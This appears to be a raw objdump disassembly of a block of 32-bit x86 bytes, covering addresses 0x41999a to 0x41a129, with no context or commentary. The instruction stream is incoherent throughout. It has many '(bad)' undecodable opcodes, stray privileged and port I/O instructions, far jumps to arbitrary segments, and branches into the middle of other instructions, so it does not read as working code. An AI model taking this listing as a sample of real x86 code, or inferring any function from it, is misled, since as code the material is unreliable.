  41999a:	cmp    DWORD PTR [eax+0x37],0xc7e206d9
  4199a1:	mov    cs:0x17b991c8,al
  4199a7:	(bad)  
  4199a8:	push   cs
  4199a9:	int    0xca
  4199ab:	retf   
  4199ac:	inc    esp
  4199ad:	out    dx,eax
  4199ae:	into   
  4199af:	inc    ecx
  4199b0:	fcomp  DWORD PTR [esi-0xc]
  4199b3:	pop    esp
  4199b4:	es aaa 
  4199b6:	inc    edx
  4199b7:	shr    BYTE PTR [esi+0x7093cd0c],0x41
  4199be:	jp     0x4199ce
  4199c0:	adc    ebx,DWORD PTR es:[eax-0x4c2bee96]
  4199c7:	ins    DWORD PTR es:[edi],dx
  4199c8:	(bad)  
  4199c9:	fsubr  QWORD PTR [ebp-0x56]
  4199cc:	jl     0x41996a
  4199ce:	pop    esi
  4199cf:	pop    esi
  4199d0:	shl    BYTE PTR [ecx+eax*1],0xb
  4199d4:	push   esp
  4199d5:	sbb    cl,dh
  4199d7:	ja     0x419992
  4199d9:	or     eax,0x2af58688
  4199de:	xchg   ecx,eax
  4199df:	(bad)  
  4199e0:	jge    0x4199b8
  4199e2:	rcr    DWORD PTR ds:0xb1c5b9b9,cl
  4199e8:	xor    eax,0x97d10e0e
  4199ed:	hlt    
  4199ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ef:	push   ss
  4199f0:	pop    edx
  4199f1:	sbb    DWORD PTR [edi+0x36],0x6653cf11
  4199f8:	dec    esp
  4199f9:	jns    0x419a17
  4199fb:	ins    BYTE PTR es:[edi],dx
  4199fc:	xor    cl,dl
  4199fe:	das    
  4199ff:	in     al,dx
  419a00:	je     0x419a47
  419a02:	loope  0x4199e1
  419a04:	stos   BYTE PTR es:[edi],al
  419a05:	loop   0x419a5a
  419a07:	pop    eax
  419a08:	mov    ds,ebx
  419a0a:	test   edi,0xd3750d64
  419a10:	cmp    BYTE PTR ds:0xfeed8bbf,cl
  419a16:	and    DWORD PTR [eax-0x53115cb3],0xb609783
  419a20:	out    dx,al
  419a21:	out    dx,eax
  419a22:	inc    ebp
  419a23:	sub    BYTE PTR [edx],bl
  419a25:	xor    eax,0x1a8c1769
  419a2a:	fisub  DWORD PTR [edx+0x5d302de7]
  419a30:	pop    ds
  419a31:	stos   BYTE PTR es:[edi],al
  419a32:	lods   eax,DWORD PTR ds:[esi]
  419a33:	in     eax,0xfb
  419a35:	cmp    esp,DWORD PTR [esi+0x75]
  419a38:	add    esi,esi
  419a3a:	mov    ebp,0xe2f2e483
  419a3f:	or     ebx,DWORD PTR [ebx]
  419a41:	xchg   edx,eax
  419a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a43:	lods   al,BYTE PTR ds:[esi]
  419a44:	xchg   ebx,eax
  419a45:	sub    ebx,DWORD PTR [eax-0x33e9c06f]
  419a4b:	adc    DWORD PTR ds:0x114f94ae,esi
  419a51:	jo     0x4199f5
  419a53:	xchg   esp,eax
  419a54:	fs daa 
  419a56:	or     bh,BYTE PTR [esi+0x18947e84]
  419a5c:	jl     0x419a1a
  419a5e:	(bad)  
  419a5f:	push   ds
  419a60:	cmp    al,ah
  419a62:	push   0xffffff81
  419a64:	or     eax,0x43446091
  419a69:	ja     0x419a3b
  419a6b:	jle    0x419ae2
  419a6d:	sbb    DWORD PTR [edx],esi
  419a6f:	sbb    al,0xe0
  419a71:	mov    cl,BYTE PTR [ebx]
  419a73:	lahf   
  419a74:	adc    BYTE PTR [edi],al
  419a76:	out    dx,al
  419a77:	adc    dl,ah
  419a79:	fist   DWORD PTR [edi+0xc]
  419a7c:	jne    0x419adf
  419a7e:	int3   
  419a7f:	(bad)  
  419a80:	pusha  
  419a81:	test   BYTE PTR ds:0xb65bcaad,0x45
  419a88:	dec    edi
  419a89:	and    eax,0xaf9c3486
  419a8e:	loopne 0x419b06
  419a90:	mov    edi,0xf733e0d3
  419a95:	and    al,0xe2
  419a97:	jmp    0xdb10d04e
  419a9c:	repz sti 
  419a9e:	mov    eax,0xe981d497
  419aa3:	add    ebp,DWORD PTR [eax+eiz*4]
  419aa6:	mov    al,0x76
  419aa8:	jmp    0x419a95
  419aaa:	jo     0x419a75
  419aac:	dec    ebx
  419aad:	dec    ebx
  419aae:	or     al,0x9c
  419ab0:	mov    ebx,0x4a501fc7
  419ab5:	mov    dl,0xf
  419ab7:	cmp    ch,BYTE PTR [esi-0x33]
  419aba:	lds    esi,FWORD PTR [ebp-0x49]
  419abd:	sub    eax,0xd3c97635
  419ac2:	aam    0x49
  419ac4:	mov    edi,0x6d53620
  419ac9:	std    
  419aca:	addr16 ds in eax,dx
  419acd:	fnstsw WORD PTR [ebp-0x6e]
  419ad0:	pusha  
  419ad1:	cs retf 
  419ad3:	mov    BYTE PTR [eax+0x20],bl
  419ad6:	adc    BYTE PTR [ebx+edx*2-0x7fc13b45],0xa5
  419ade:	sbb    dl,ah
  419ae0:	lods   eax,DWORD PTR ds:[esi]
  419ae1:	push   ebp
  419ae2:	or     al,0x8a
  419ae4:	cwde   
  419ae5:	dec    ebp
  419ae6:	stc    
  419ae7:	jmp    0x419a9d
  419ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aea:	out    dx,eax
  419aeb:	mov    ch,0x26
  419aed:	mov    bl,dh
  419aef:	out    0x93,eax
  419af1:	int    0xb6
  419af3:	push   esp
  419af4:	jmp    0x419ac0
  419af6:	push   esp
  419af7:	fisub  DWORD PTR [esi+0x1b4b149d]
  419afd:	dec    eax
  419afe:	dec    ebp
  419aff:	icebp  
  419b00:	lods   eax,DWORD PTR ds:[esi]
  419b01:	fwait
  419b02:	lahf   
  419b03:	fwait
  419b04:	imul   edi,DWORD PTR [ebp+ebx*8-0x5136e91f],0x72e8fe9f
  419b0f:	jg     0x419aa3
  419b11:	rcl    dl,cl
  419b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b14:	das    
  419b15:	jecxz  0x419ace
  419b17:	js     0x4aea6123
  419b1d:	pusha  
  419b1e:	mov    ecx,0x596ca92b
  419b23:	add    DWORD PTR [ecx+esi*8+0x47a93001],esi
  419b2a:	push   esp
  419b2b:	outs   dx,DWORD PTR ds:[esi]
  419b2c:	popa   
  419b2d:	or     eax,esi
  419b2f:	fstp   TBYTE PTR [edi]
  419b31:	das    
  419b32:	and    BYTE PTR [edx-0x28d8f494],ch
  419b38:	loopne 0x419ac5
  419b3a:	loop   0x419b22
  419b3c:	sub    eax,0x5edacbe5
  419b41:	out    dx,eax
  419b42:	xchg   ecx,eax
  419b43:	cmp    bl,cl
  419b45:	push   es
  419b46:	and    eax,0xdd5a91d2
  419b4b:	div    BYTE PTR [edi+ebp*2-0x35]
  419b4f:	sti    
  419b50:	pop    ss
  419b51:	shr    BYTE PTR [ebx],1
  419b53:	(bad)  
  419b54:	test   BYTE PTR es:[ecx+0x53],bh
  419b58:	or     DWORD PTR [eax+0x2af68220],edx
  419b5e:	push   ebx
  419b5f:	inc    eax
  419b60:	xlat   BYTE PTR ds:[ebx]
  419b61:	push   ebx
  419b62:	pop    edi
  419b64:	fwait
  419b65:	out    dx,eax
  419b66:	psubq  mm0,QWORD PTR [ebp+esi*4+0x2a]
  419b6b:	jp     0x419b04
  419b6d:	pop    ebp
  419b6e:	inc    esp
  419b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b70:	sbb    ebx,DWORD PTR [ebp+0x27858952]
  419b76:	test   al,0xbf
  419b78:	retf   
  419b79:	mov    BYTE PTR [edx-0x51],al
  419b7c:	sub    eax,0x808ccebd
  419b81:	mov    dh,0x9
  419b83:	in     al,0x49
  419b85:	or     ch,BYTE PTR [ebp-0x68734c7e]
  419b8b:	dec    esi
  419b8c:	mov    ebx,DWORD PTR [ebp+0x58]
  419b8f:	sbb    DWORD PTR [esp-0x54ca0304],0xffffffb0
  419b97:	adc    al,0x4d
  419b99:	cmp    eax,0xa1ee7458
  419b9e:	push   ecx
  419b9f:	addr16 push esi
  419ba1:	das    
  419ba2:	aam    0xf6
  419ba4:	(bad)  [ebp-0x2a8f1fdf]
  419baa:	in     eax,0x23
  419bac:	sub    al,0x9e
  419bae:	test   bl,0xee
  419bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb2:	cld    
  419bb3:	aas    
  419bb4:	pop    ds
  419bb5:	lods   eax,DWORD PTR ds:[esi]
  419bb6:	jae    0x419bfa
  419bb8:	push   ds
  419bb9:	das    
  419bba:	rcr    eax,cl
  419bbc:	jp     0x419b96
  419bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bbf:	fisttp WORD PTR [esi+0x20]
  419bc2:	sets   BYTE PTR [edx+0x40]
  419bc6:	or     eax,0x16d27206
  419bcb:	call   0xc704b185
  419bd0:	sti    
  419bd1:	inc    ecx
  419bd2:	jmp    0x4d4a:0xa6699f0d
  419bd9:	pop    edx
  419bda:	fmul   QWORD PTR [esi-0x60]
  419bdd:	inc    esp
  419bde:	sub    al,0x7a
  419be0:	mov    ebx,0x78c2fcd5
  419be5:	repnz sbb ch,BYTE PTR [ecx-0x10]
  419be9:	jns    0x419bf5
  419beb:	adc    ch,dh
  419bed:	sub    ebp,esp
  419bef:	and    BYTE PTR [esi+0x2d],dh
  419bf2:	rol    esp,cl
  419bf4:	aam    0x2e
  419bf6:	xchg   esp,eax
  419bf7:	sub    al,al
  419bf9:	jo     0x419c0d
  419bfb:	rol    BYTE PTR [esi],0x97
  419bfe:	or     DWORD PTR [esi],esp
  419c00:	mov    bl,0x48
  419c02:	jb     0x419c59
  419c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c05:	shl    DWORD PTR [eax+0x5a28e5f5],cl
  419c0b:	arpl   WORD PTR [esp+ebp*1],ax
  419c0e:	sbb    bh,dh
  419c10:	add    BYTE PTR [ecx-0x2d],cl
  419c13:	loop   0x419bfe
  419c15:	jp     0x419bb8
  419c17:	inc    ecx
  419c18:	mov    bh,0x1e
  419c1a:	inc    edx
  419c1b:	data16 shl BYTE PTR [ebx-0x58355099],0xd
  419c23:	in     al,0x93
  419c25:	out    dx,eax
  419c26:	or     cl,bh
  419c28:	pusha  
  419c29:	pop    ecx
  419c2a:	jnp    0x419c4f
  419c2c:	into   
  419c2d:	call   0xcf48d19
  419c32:	push   es
  419c33:	inc    esp
  419c34:	pop    eax
  419c35:	xchg   ebx,eax
  419c36:	scas   eax,DWORD PTR es:[edi]
  419c37:	inc    esp
  419c38:	or     DWORD PTR [esi-0x6b],ebx
  419c3b:	(bad)  
  419c3c:	scas   al,BYTE PTR es:[edi]
  419c3d:	push   ebp
  419c3e:	ss dec ebp
  419c40:	test   DWORD PTR [eax+0x64f6baa4],0x70c83eae
  419c4a:	pop    esp
  419c4b:	and    eax,0xe1617faa
  419c50:	add    ecx,ebp
  419c52:	fucomip st,st(6)
  419c54:	jbe    0x419cd1
  419c56:	lock adc ch,BYTE PTR [ebx+esi*2-0x5f7d20e9]
  419c5e:	or     BYTE PTR [edi],bh
  419c60:	or     DWORD PTR [edx+0x5d397cdc],esp
  419c66:	add    al,0x75
  419c68:	into   
  419c69:	scas   al,BYTE PTR es:[edi]
  419c6a:	shl    BYTE PTR [eax],0xd7
  419c6d:	xchg   ebp,eax
  419c6e:	xor    eax,0xfb54a0eb
  419c73:	aas    
  419c74:	lock out 0x38,eax
  419c77:	sbb    BYTE PTR [esi+0x72603cb3],cl
  419c7d:	mov    dl,0x9c
  419c7f:	adc    cl,BYTE PTR [edi-0x7d4d2d0f]
  419c85:	(bad)  
  419c86:	cmp    eax,0xcaa90bba
  419c8b:	mov    edi,0x284aae82
  419c90:	imul   edi,DWORD PTR [ebx+0x7c],0xffffff8f
  419c94:	fistp  QWORD PTR [eax+ebp*1+0x17]
  419c98:	setp   cl
  419c9b:	cdq    
  419c9c:	and    DWORD PTR [ebx],edx
  419c9e:	out    0x72,eax
  419ca0:	ins    BYTE PTR es:[edi],dx
  419ca1:	rcr    DWORD PTR [esi],1
  419ca3:	xchg   esi,eax
  419ca4:	stos   DWORD PTR es:[edi],eax
  419ca5:	sti    
  419ca6:	in     al,0xc7
  419ca8:	out    dx,al
  419ca9:	add    cl,cl
  419cab:	enter  0xbfc2,0x92
  419caf:	jno    0x419cee
  419cb1:	jg     0x419d06
  419cb3:	out    0xc3,al
  419cb5:	test   al,0x4a
  419cb7:	ja     0x419cd6
  419cb9:	pop    edi
  419cba:	adc    DWORD PTR [edx-0x1f],esp
  419cbd:	jmp    0xd9a00597
  419cc2:	imul   ecx,DWORD PTR [eax+0x1a],0x483b559
  419cc9:	shl    DWORD PTR [edx+edx*8-0x6606fe08],0xea
  419cd1:	adc    bl,BYTE PTR ds:0x353049d6
  419cd7:	in     al,dx
  419cd8:	and    al,0x22
  419cda:	daa    
  419cdb:	push   esi
  419cdc:	jae    0x419c5f
  419cde:	pop    eax
  419cdf:	mov    dh,0x62
  419ce1:	sub    eax,0xd2ee012a
  419ce6:	mov    DWORD PTR [edi],0x25ec51be
  419cec:	rcl    DWORD PTR [ecx-0x3afbd11e],cl
  419cf2:	(bad)  
  419cf3:	push   eax
  419cf4:	jbe    0x419cc6
  419cf6:	adc    esp,DWORD PTR [ebx-0x7eeddeef]
  419cfc:	(bad)  
  419cfe:	fstp   TBYTE PTR [ecx+0x332a5d21]
  419d04:	push   es
  419d05:	pushf  
  419d06:	out    0xb7,eax
  419d08:	dec    edx
  419d09:	cmc    
  419d0a:	sbb    dl,cl
  419d0c:	push   ebp
  419d0d:	xchg   BYTE PTR [ecx+ecx*4-0x4e],dl
  419d11:	arpl   WORD PTR ds:0xab1dcd4c,di
  419d17:	jb     0x419ca8
  419d19:	sub    eax,0x5e231e6f
  419d1e:	and    DWORD PTR [eax],esp
  419d20:	nop
  419d21:	pop    ebp
  419d22:	pop    ds
  419d23:	push   ecx
  419d24:	sbb    edi,ebx
  419d26:	loopne 0x419cda
  419d28:	mov    dh,0x72
  419d2a:	and    al,0x59
  419d2c:	add    eax,0x2a028262
  419d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d32:	(bad)  
  419d33:	ja     0x419da6
  419d35:	pop    ebp
  419d36:	dec    ebp
  419d37:	mov    ah,0x7c
  419d39:	adc    eax,0xd9271695
  419d3e:	cmp    eax,0xe5f51764
  419d43:	push   ecx
  419d44:	lahf   
  419d45:	cdq    
  419d46:	sbb    bh,BYTE PTR [esi-0x46]
  419d49:	dec    esp
  419d4a:	push   edi
  419d4b:	mov    DWORD PTR [eax-0x63968aa4],0x30d7d0b3
  419d55:	and    dl,BYTE PTR [eax+ecx*2-0x21]
  419d59:	sub    edi,DWORD PTR [ecx-0x10]
  419d5c:	cmp    ah,BYTE PTR [ebp-0x5b085641]
  419d62:	fcmovnu st,st(1)
  419d64:	scas   al,BYTE PTR es:[edi]
  419d65:	and    edx,ecx
  419d67:	cli    
  419d68:	fisub  DWORD PTR [esi]
  419d6a:	jb     0x419dce
  419d6c:	mov    BYTE PTR [ecx],cl
  419d6e:	fdivr  st,st(3)
  419d70:	test   eax,0xac82873f
  419d75:	repz sbb ecx,ecx
  419d78:	inc    esi
  419d79:	push   0xffffffc4
  419d7b:	mov    cl,0x91
  419d7d:	in     eax,0x88
  419d7f:	iret   
  419d80:	mov    WORD PTR [ebx-0xecb5419],ds
  419d86:	fwait
  419d87:	div    eax
  419d89:	stos   DWORD PTR es:[edi],eax
  419d8a:	jnp    0x419e09
  419d8c:	add    cl,BYTE PTR [esi]
  419d8e:	sbb    bl,BYTE PTR [edx]
  419d90:	mov    DWORD PTR [esi+0x5e954910],esp
  419d96:	fisubr DWORD PTR [edx+0x5b]
  419d99:	mov    ebp,0xe928370b
  419d9e:	lahf   
  419d9f:	iret   
  419da0:	sbb    eax,0x7257a305
  419da5:	adc    ch,BYTE PTR [eax-0x9383d78]
  419dab:	add    al,0x4c
  419dad:	mov    al,ds:0xaf0e3215
  419db2:	(bad)  
  419db3:	aam    0x97
  419db5:	data16 mov dl,0x81
  419db8:	sub    eax,0x5f356a9e
  419dbd:	jns    0x419ddc
  419dbf:	jp     0x419d59
  419dc1:	add    eax,0xc604b2f9
  419dc6:	stos   DWORD PTR es:[edi],eax
  419dc7:	adc    eax,0xc2566bd8
  419dcc:	das    
  419dcd:	out    dx,eax
  419dce:	(bad)  
  419dcf:	or     BYTE PTR [esi-0x5a41eeab],ah
  419dd5:	add    BYTE PTR [esp+edx*8-0x7e],bl
  419dd9:	repnz fsubr DWORD PTR [edx]
  419ddc:	test   DWORD PTR [esi-0x6180dfca],0x1fa1444f
  419de6:	and    edx,DWORD PTR [eax]
  419de8:	repz or BYTE PTR [ecx],dl
  419deb:	mov    bh,0x7c
  419ded:	push   ebp
  419dee:	mov    bl,0xe7
  419df0:	addr16 call 0x88a8469e
  419df6:	(bad)  
  419df7:	adc    BYTE PTR [eax+0x54a65fce],dl
  419dfd:	fistp  WORD PTR [ebx]
  419dff:	sub    eax,0x3eb5314
  419e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e05:	fisttp DWORD PTR [esi+0x350b5744]
  419e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e0c:	sub    DWORD PTR [ecx-0x68],0x5ca64b6e
  419e13:	push   ecx
  419e14:	test   eax,0x1ce79b16
  419e19:	shl    ecx,1
  419e1b:	scas   al,BYTE PTR es:[edi]
  419e1c:	cmc    
  419e1d:	jb     0x419ddd
  419e1f:	lea    edi,[esp+ebp*1+0x2]
  419e23:	push   ecx
  419e24:	push   0x2af239d5
  419e29:	add    cl,BYTE PTR [ebx+0x224aa4f]
  419e2f:	add    BYTE PTR [edx+0x650ae9a6],ch
  419e35:	xor    al,0x77
  419e37:	ja     0x419dcd
  419e39:	add    al,0x13
  419e3b:	fnstcw WORD PTR [esi]
  419e3d:	xchg   ecx,eax
  419e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e3f:	mov    edx,0x3e2806de
  419e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e45:	adc    DWORD PTR [esi+ebp*1],ecx
  419e48:	push   ebp
  419e49:	mov    BYTE PTR [eax],bl
  419e4b:	jne    0x419ec4
  419e4d:	mov    bl,0xee
  419e4f:	and    eax,0xfaa34367
  419e54:	ret    
  419e55:	and    eax,0xe2d2a0e9
  419e5a:	sub    ebp,ebp
  419e5c:	cld    
  419e5d:	cmp    esp,ecx
  419e5f:	aas    
  419e60:	hlt    
  419e61:	sbb    BYTE PTR [esp+esi*4+0x49b2ad41],cl
  419e68:	and    DWORD PTR [edi],edi
  419e6a:	arpl   WORD PTR [edx+0x59],si
  419e6d:	mov    cs,WORD PTR [edx+0x4de2966e]
  419e73:	jns    0x419e5d
  419e75:	xor    edi,DWORD PTR [eax-0x68e7a2f7]
  419e7b:	repz scas al,BYTE PTR es:[edi]
  419e7d:	stc    
  419e7e:	fcomp  QWORD PTR [ecx-0x5fa024f4]
  419e84:	retf   
  419e85:	inc    esp
  419e86:	inc    ecx
  419e87:	icebp  
  419e88:	gs pop es
  419e8a:	fimul  WORD PTR [edx+0x58]
  419e8d:	(bad)  
  419e8e:	imul   ecx,DWORD PTR [ebx-0x4b],0x572538f7
  419e95:	pop    gs
  419e97:	pop    es
  419e98:	ret    
  419e99:	pop    es
  419e9a:	dec    edx
  419e9b:	sahf   
  419e9c:	cmp    cl,BYTE PTR [edi]
  419e9e:	out    dx,eax
  419e9f:	xchg   edx,eax
  419ea0:	jge    0x419eb6
  419ea2:	push   ss
  419ea3:	pop    eax
  419ea4:	sbb    eax,0xaaa51eaf
  419ea9:	out    0x3b,al
  419eab:	pop    ss
  419eac:	data16 cli 
  419eae:	dec    eax
  419eaf:	or     DWORD PTR [eax+0x3838c4a4],ecx
  419eb5:	pop    ecx
  419eb6:	xchg   esp,eax
  419eb7:	or     eax,0xfa367b49
  419ebc:	mov    dl,0xa0
  419ebe:	mov    dh,0x91
  419ec0:	or     ebp,ebp
  419ec2:	nop
  419ec3:	add    dl,BYTE PTR [ecx+0x2a]
  419ec6:	dec    ebx
  419ec7:	(bad)  
  419ec8:	shl    BYTE PTR [eax+0x8bede5d],0xe
  419ecf:	repz push eax
  419ed1:	cmp    eax,0xc4f13c9
  419ed6:	stc    
  419ed7:	icebp  
  419ed8:	pusha  
  419ed9:	add    edx,0x38f4b7f6
  419edf:	pop    es
  419ee0:	inc    ecx
  419ee1:	and    al,0xdc
  419ee3:	dec    eax
  419ee4:	mov    edx,0x5c15bc7b
  419ee9:	sbb    BYTE PTR [edi],bh
  419eeb:	or     ch,dh
  419eed:	stos   BYTE PTR es:[edi],al
  419eee:	std    
  419eef:	call   0x5570a23b
  419ef4:	inc    eax
  419ef5:	dec    eax
  419ef6:	cmp    dl,bh
  419ef8:	stos   BYTE PTR es:[edi],al
  419ef9:	mov    gs,WORD PTR [eax+0x3f]
  419efc:	out    0x93,al
  419efe:	cmp    DWORD PTR [ecx+0x71],0xfcf7d988
  419f05:	add    eax,0xdc0949e8
  419f0a:	das    
  419f0b:	adc    eax,0xe706d338
  419f10:	sbb    BYTE PTR [ecx+0x41],0xe
  419f14:	jae    0x419f0b
  419f16:	xor    al,0x79
  419f18:	xchg   ebp,eax
  419f19:	push   DWORD PTR [ebx]
  419f1b:	xor    al,0xc7
  419f1d:	cmp    eax,DWORD PTR [eax-0x1f]
  419f20:	mov    ebx,0xc527dda3
  419f25:	mov    ecx,fs
  419f27:	arpl   WORD PTR [edi],sp
  419f29:	jg     0x419eb7
  419f2b:	test   DWORD PTR [ebx],edx
  419f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f2e:	dec    ebx
  419f2f:	stc    
  419f30:	scas   eax,DWORD PTR es:[edi]
  419f31:	test   al,0xd4
  419f33:	adc    eax,0x54060e97
  419f38:	scas   al,BYTE PTR es:[edi]
  419f39:	xor    al,0x12
  419f3b:	pop    ds
  419f3c:	xchg   esp,eax
  419f3d:	loope  0x419f2e
  419f3f:	pop    ss
  419f40:	pop    edi
  419f41:	sub    eax,0x3ebbbaa1
  419f46:	iret   
  419f47:	pop    ebx
  419f48:	call   0x37ded050
  419f4d:	push   esp
  419f4e:	jmp    0x646b7697
  419f53:	scas   al,BYTE PTR es:[edi]
  419f54:	pop    edi
  419f55:	lahf   
  419f56:	or     eax,0xe4726edd
  419f5b:	test   eax,0x5a31de48
  419f60:	stos   DWORD PTR es:[edi],eax
  419f61:	aaa    
  419f62:	arpl   WORD PTR [ebx],sp
  419f64:	scas   eax,DWORD PTR es:[edi]
  419f65:	stc    
  419f66:	adc    BYTE PTR [eax-0x7],dl
  419f69:	xchg   ebp,eax
  419f6a:	sbb    ah,cl
  419f6c:	jb     0x419fa4
  419f6e:	repz test ch,0xa
  419f72:	mov    bl,0x13
  419f74:	jno    0x419fdf
  419f76:	inc    eax
  419f77:	add    BYTE PTR [ebp+0x6c364298],0x99
  419f7e:	pusha  
  419f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f80:	inc    edx
  419f81:	lds    esi,FWORD PTR [edi-0x6a]
  419f84:	and    bl,BYTE PTR [ebx-0x3ef9efa6]
  419f8a:	jmp    FWORD PTR [ecx]
  419f8c:	adc    eax,0x1a83f2a3
  419f91:	mov    eax,ds:0x344e9089
  419f96:	aad    0x0
  419f98:	scas   al,BYTE PTR es:[edi]
  419f99:	popa   
  419f9a:	push   ebp
  419f9b:	icebp  
  419f9c:	mov    eax,ds:0xe4a86c85
  419fa1:	int    0x15
  419fa3:	lods   al,BYTE PTR gs:[esi]
  419fa5:	mov    al,ds:0xe6896951
  419faa:	dec    eax
  419fab:	aad    0xda
  419fad:	leave  
  419fae:	mov    ch,0x8e
  419fb0:	cdq    
  419fb1:	stos   DWORD PTR es:[edi],eax
  419fb2:	repz adc DWORD PTR [edi+esi*8-0x522753c6],edi
  419fba:	push   esp
  419fbb:	pop    esp
  419fbc:	pop    esp
  419fbd:	pop    ss
  419fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fbf:	into   
  419fc0:	int3   
  419fc1:	jge    0x419ff9
  419fc3:	jecxz  0x419fee
  419fc5:	mov    al,0xc7
  419fc7:	les    edi,FWORD PTR [ebp+0x405e71b8]
  419fcd:	push   esp
  419fce:	cld    
  419fcf:	shr    BYTE PTR [edx-0x2c],cl
  419fd2:	push   esp
  419fd3:	into   
  419fd4:	std    
  419fd5:	jo     0x41a006
  419fd7:	(bad)  
  419fd8:	mov    ds,eax
  419fda:	pop    ebx
  419fdb:	dec    edx
  419fdc:	inc    ebx
  419fdd:	adc    eax,DWORD PTR [ebx+edi*2-0x45]
  419fe1:	inc    edi
  419fe2:	daa    
  419fe3:	mov    dh,0x59
  419fe5:	pop    esp
  419fe6:	adc    ebx,0x7a
  419fe9:	adc    dh,BYTE PTR [eax-0x287f2c22]
  419fef:	loop   0x419fa0
  419ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ff2:	iret   
  419ff3:	fisubr WORD PTR [ecx-0x7f]
  419ff6:	ret    0x47c2
  419ff9:	lds    edx,FWORD PTR [edi+0x5d]
  419ffc:	jno    0x419f80
  419ffe:	adc    ah,BYTE PTR [esi-0x654a2d44]
  41a004:	test   BYTE PTR [ebx-0x30],bl
  41a007:	jb     0x41a042
  41a009:	push   DWORD PTR [edx-0x45]
  41a00c:	sub    DWORD PTR [ecx],edi
  41a00e:	mov    eax,ds:0xa5ffdc2f
  41a013:	ret    0x8f5
  41a016:	push   ds
  41a017:	xchg   ecx,eax
  41a018:	push   es
  41a019:	sub    al,0x19
  41a01b:	shl    BYTE PTR [ecx],0x9e
  41a01e:	ret    
  41a01f:	int3   
  41a020:	jnp    0x41a05a
  41a022:	test   dl,0x7f
  41a025:	xor    bl,BYTE PTR [esi]
  41a027:	std    
  41a028:	add    al,dl
  41a02a:	jno    0x41a07d
  41a02c:	push   ss
  41a02d:	scas   al,BYTE PTR es:[edi]
  41a02e:	gs mov dl,0x9a
  41a031:	or     al,0xed
  41a033:	jae    0x41a01e
  41a035:	mov    ch,dl
  41a037:	lods   al,BYTE PTR ds:[esi]
  41a038:	retf   0xab75
  41a03b:	ins    DWORD PTR es:[edi],dx
  41a03c:	das    
  41a03d:	xor    ebx,edx
  41a03f:	xchg   DWORD PTR [esi-0x4a4638b8],ebx
  41a045:	inc    edx
  41a046:	jp     0x41a004
  41a048:	fucomp st(3)
  41a04a:	stc    
  41a04b:	inc    esi
  41a04c:	aam    0x1
  41a04e:	loop   0x419ffe
  41a050:	xchg   ebp,eax
  41a051:	inc    edi
  41a052:	pop    es
  41a053:	adc    bh,bh
  41a055:	(bad)  
  41a057:	inc    ecx
  41a058:	add    cl,BYTE PTR [edx+ebp*4-0x19]
  41a05c:	pop    ecx
  41a05d:	xchg   ecx,eax
  41a05e:	mov    ecx,0x9ac6e99
  41a063:	mov    eax,ds:0x6e7612bd
  41a068:	inc    ebx
  41a069:	jl     0x41a0bb
  41a06b:	xchg   esi,eax
  41a06c:	rcl    DWORD PTR [ebp+0x69],cl
  41a06f:	or     BYTE PTR [esi+ebp*2-0x480e782c],bl
  41a076:	dec    ebp
  41a077:	sbb    eax,0x5c258294
  41a07c:	jb     0x41a002
  41a07e:	inc    ecx
  41a07f:	or     ebx,DWORD PTR cs:[ebp-0x395f2add]
  41a086:	pop    ds
  41a087:	es mov ebx,0xbeeda408
  41a08d:	js     0x41a05a
  41a08f:	sti    
  41a090:	xchg   esi,eax
  41a091:	or     DWORD PTR [ecx],esp
  41a093:	xor    edi,DWORD PTR [ecx+0x4872dfcc]
  41a099:	sbb    edx,edx
  41a09b:	clc    
  41a09c:	adc    al,0x49
  41a09e:	pusha  
  41a09f:	imul   DWORD PTR [esi+0x63aea7af]
  41a0a5:	rcr    BYTE PTR [edi+0x4edc9de3],0xf9
  41a0ac:	and    ch,BYTE PTR [edi+0x443e7dd5]
  41a0b2:	(bad)  
  41a0b3:	stc    
  41a0b4:	and    BYTE PTR ds:0x46b17b0a,ch
  41a0ba:	(bad)  
  41a0bb:	dec    edi
  41a0bc:	sti    
  41a0bd:	sub    DWORD PTR [ecx],0xf8844dbb
  41a0c3:	jle    0x41a09b
  41a0c5:	je     0x41a057
  41a0c7:	(bad)  
  41a0c8:	mov    eax,0xe9e860b4
  41a0cd:	mov    edx,0xbba11a87
  41a0d2:	test   BYTE PTR [ebx+0x24],bl
  41a0d5:	gs or  cl,bl
  41a0d8:	mov    ch,0x68
  41a0da:	push   esp
  41a0db:	push   eax
  41a0dc:	mov    cl,0x65
  41a0de:	ds mov dl,0x8
  41a0e1:	mov    bh,0x33
  41a0e3:	or     BYTE PTR [ecx-0x172e24f4],dl
  41a0e9:	dec    ecx
  41a0ea:	ins    DWORD PTR es:[edi],dx
  41a0eb:	fwait
  41a0ec:	int    0xd3
  41a0ee:	xor    al,0xa7
  41a0f0:	cmove  ebx,DWORD PTR [di-0x253a]
  41a0f6:	les    ecx,FWORD PTR [edx-0x2a8c4a8b]
  41a0fc:	fbld   TBYTE PTR [eax+edx*1-0x40]
  41a100:	add    BYTE PTR [ecx],dl
  41a102:	(bad)  
  41a103:	fisubr WORD PTR [ebp-0x6ba9eebe]
  41a109:	imul   ebx,DWORD PTR [ebx-0x9e03ddd],0x75e37142
  41a113:	and    eax,0x1de7bb1e
  41a118:	or     al,0xe0
  41a11a:	xor    esi,DWORD PTR [ebx]
  41a11c:	(bad)  
  41a11d:	cmp    ah,BYTE PTR [esi+0x61]
  41a120:	or     bh,dh
  41a122:	sub    bl,BYTE PTR [ebx+eax*8+0x75084c6c]
  41a129:	mov    ch,0x7f
